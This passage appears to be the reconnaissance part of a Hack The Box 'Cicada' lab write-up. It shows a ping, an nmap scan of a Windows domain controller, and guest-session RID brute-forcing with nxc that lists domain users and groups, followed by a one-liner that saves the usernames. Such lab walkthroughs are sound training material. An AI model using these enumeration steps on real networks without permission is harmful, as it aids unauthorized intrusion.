- ping box to check if alive
```bash
╰─ ping 10.10.11.35                                                                                                   
PING 10.10.11.35 (10.10.11.35) 56(84) bytes of data.                                                                  
64 bytes from 10.10.11.35: icmp_seq=1 ttl=127 time=44.3 ms                                                            
64 bytes from 10.10.11.35: icmp_seq=2 ttl=127 time=1004 ms                                                                                                                                                               
64 bytes from 10.10.11.35: icmp_seq=3 ttl=127 time=31.3 ms                                                                                                                                                               
64 bytes from 10.10.11.35: icmp_seq=4 ttl=127 time=28.3 ms                                                                                                                                                               
64 bytes from 10.10.11.35: icmp_seq=5 ttl=127 time=29.7 ms                                                                                                                                                               
^C                                                                                                                                                                                                                       
--- 10.10.11.35 ping statistics ---                                                                                                                                                                                      
5 packets transmitted, 5 received, 0% packet loss, time 4008ms                                                                                                                                                           
rtt min/avg/max/mdev = 28.276/227.530/1004.042/388.297 ms    
```

- nmap for open ports
```bash
╰─ nmap -p$ports -sSCV --min-rate=2000 10.10.11.35 -Pn -oN cicadaNmapServicesVersions.txt                                                                                                                                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-28 18:48 EDT                                                                                                                                                          
Nmap scan report for 10.10.11.35                                                                                                                                                                                         
Host is up (0.029s latency).                                                                                                                                                                                             
                                                                                                                                                                                                                         
PORT      STATE SERVICE       VERSION                                                                                                                                                                                    
53/tcp    open  domain        Simple DNS Plus                                                                                                                                                                            
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-29 05:49:00Z)                                                                                                                             
135/tcp   open  msrpc         Microsoft Windows RPC                                                                                                                                                                      
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                                                                                              
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)                                                                                              
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb                                                                                                                                                                     
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb                                                                                                                      
| Not valid before: 2024-08-22T20:24:16                                                                                                                                                                                  
|_Not valid after:  2025-08-22T20:24:16                                                                                                                                                                                  
|_ssl-date: TLS randomness does not represent time                                                                                                                                                                       
445/tcp   open  microsoft-ds?                                                                                                                                                                                            
464/tcp   open  kpasswd5?                                                                                                                                                                                                
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                                                                                                                        
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)                                                                                              
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb                                                                                                                                                                     
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb                                                                                                                      
| Not valid before: 2024-08-22T20:24:16                                                                                                                                                                                  
|_Not valid after:  2025-08-22T20:24:16                                                                                                                                                                                  
|_ssl-date: TLS randomness does not represent time                                                                                                                                                                       
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb                                                        
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16                                                                     
|_Not valid after:  2025-08-22T20:24:16                                                                     
|_ssl-date: TLS randomness does not represent time                                                          
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb                                                        
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16                                                                     
|_Not valid after:  2025-08-22T20:24:16                                                                     
|_ssl-date: TLS randomness does not represent time                                                          
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                       
|_http-server-header: Microsoft-HTTPAPI/2.0                                                                 
|_http-title: Not Found                               
64720/tcp open  msrpc         Microsoft Windows RPC                                                         
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows    

Host script results:                                  
|_clock-skew: 6h59m59s                                
| smb2-security-mode:                                 
|   3:1:1:                                            
|_    Message signing enabled and required                                                                  
| smb2-time:                                          
|   date: 2025-05-29T05:49:50                         
|_  start_date: N/A                                   

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.11 seconds             
```

- Information from nmap scan
	- domain - cicada.htb - Add to /etc/hosts
	- hostname - CICADA-DC - Add to /etc/hosts
	- rpc (135), netbios (139), smb (445) are common on windows machines
	- DNS (53), Kerberos (88), LDAP (389,636,3268,3269) are common on DCs

- using nxc smb module to brute force RID (relative ID) of users, groups, aliases.
	- not 'anonymous' specific - any non-existent user will be interpreted at guest
	- below reveals users, groups, aliases.
	- 1000+ is usually additional and are our target here.
```bash
╭─ ~/htb/cicada ▓▒░────────────────────────────────────────────────────────────────────────────────────░▒▓ ✔  3s  07:06:57 PM 
╰─ unbuffer nxc smb 10.10.11.35 -u 'anonymous' -p ''  --rid-brute                                                                  
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (s
igning:True) (SMBv1:False)      
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\anonymous: (Guest)
SMB         10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)

```
- we can pull a list of user out of the scan with 
- `nxc smb CICADA-DC -u guest -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 | tee smbUsers.txt`
``














